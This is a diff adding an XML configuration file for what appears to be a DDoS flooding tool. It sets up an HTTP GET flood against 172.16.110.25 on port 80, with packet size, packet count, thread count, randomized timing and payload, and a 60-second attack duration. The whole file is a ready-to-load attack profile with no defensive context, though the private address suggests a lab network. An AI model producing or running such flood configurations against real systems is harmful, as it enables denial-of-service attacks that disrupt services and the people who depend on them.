@@ -1,0 +1,18 @@
+<?xml version='1.0' encoding='utf-8'?>
+<ddos mode='signal'>
+<destIp type='ip'>172.16.110.25</destIp>
+<destPort>80</destPort>
+<generalMess id='uniform'><startThreadNumber>1</startThreadNumber>
+<sendPacketNumber>100</sendPacketNumber>
+<packetTime random='true'><value></value><scope><from>1</from><to>30</to></scope><meth>1</meth></packetTime>
+<pulse><cycleTime></cycleTime><pulseTime></pulseTime><speed></speed></pulse>
+<attackTime>60</attackTime>
+</generalMess><styleList>
+<style id='httpflood'>
+<packetLength>1000</packetLength>
+<dataHeader>
+<httpRequest>GET /index.php HTTP/1.1\r\nHost:172.16.110.25\r\n</httpRequest>
+</dataHeader>
+<data random='true'><value></value><scope>y,iLove,z,777,tiankong</scope><meth>1</meth></data>
+</style></styleList>
+</ddos>
